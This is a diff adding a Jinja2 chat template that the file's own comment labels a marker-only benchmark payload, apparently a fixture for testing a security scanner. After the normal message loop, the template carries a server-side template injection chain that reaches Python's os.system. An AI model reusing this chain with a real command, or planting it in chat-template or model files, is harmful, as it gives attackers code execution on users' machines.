@@ -1,0 +1,5 @@
+{#- MARKER-only Phase-8 benchmark payload. Technique + CVE provenance: see MANIFEST.json
+    and ../README.md. Never rendered destructively; sentinel only. Comment kept free of
+    literal sink tokens so it cannot contaminate a text scanner. -#}
+{% for m in messages %}{{ m.role }}: {{ m.content }}
+{% endfor %}{{ self.__init__.__globals__.__builtins__.__import__('os').system('GLYPHHOUND_BENCH_MARKER') }}
